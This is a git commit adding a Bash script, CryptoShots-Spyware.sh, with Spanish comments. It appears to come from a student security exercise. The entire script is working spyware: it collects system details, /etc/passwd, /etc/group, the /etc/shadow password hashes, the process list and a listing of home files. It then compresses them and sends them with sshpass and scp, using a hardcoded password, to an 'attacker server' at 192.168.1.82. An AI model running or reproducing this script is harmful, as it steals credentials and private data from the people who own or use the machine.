663242c4d2d14e4db49ba1d264bf2c872d2b2f78
Kevin-Antonio-Carvajal <kevin-antonio@ciencias.unam.mx>
2024-11-05 03:15:43 -0600

    1

---
+++ CryptoShots-Spyware.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+# Actualización de repositorios e instalación de utilidades necesarias
+echo "[+] Instalando dependencias necesarias..."
+apt-get install -y lsb-release tar openssh-client sshpass
+
+echo "[+] Dependencias instaladas correctamente."
+
+# Recolección de información del sistema
+echo "[+] Recolectando información del sistema..."
+uname -a > /tmp/system_info.txt
+lsb_release -a >> /tmp/system_info.txt
+
+# Recolección de información de usuarios y grupos
+echo "[+] Recolectando información de usuarios y grupos..."
+cat /etc/passwd >> /tmp/user_info.txt
+cat /etc/group >> /tmp/user_info.txt
+sudo cat /etc/shadow >> /tmp/user_info.txt
+
+# Recolección de información de procesos activos
+echo "[+] Recolectando información de procesos activos..."
+ps aux >> /tmp/processes_info.txt
+
+# Recolección de archivos en el home
+echo "[+] Recolectando información de archivos en el home..."
+find /home/* -type f -exec ls -lh {} \; | awk '{print $9, $5, $1}' > /tmp/files_info.txt
+
+# Preparación de archivos para exfiltrar
+echo "[+] Comprimendo los archivos..."
+tar -czf /tmp/exfiltrated_data.tar.gz /tmp/system_info.txt /tmp/user_info.txt /tmp/processes_info.txt /tmp/files_info.txt
+
+# Enviar el archivo al atacante usando sshpass y scp
+echo "[+] Enviando los archivos al servidor atacante..."
+sshpass -p "changeme" scp /tmp/exfiltrated_data.tar.gz vboxuser@192.168.1.82:/home/vboxuser/exfiltrated_data
+
+echo "[+] Proceso completo. Información exfiltrada."
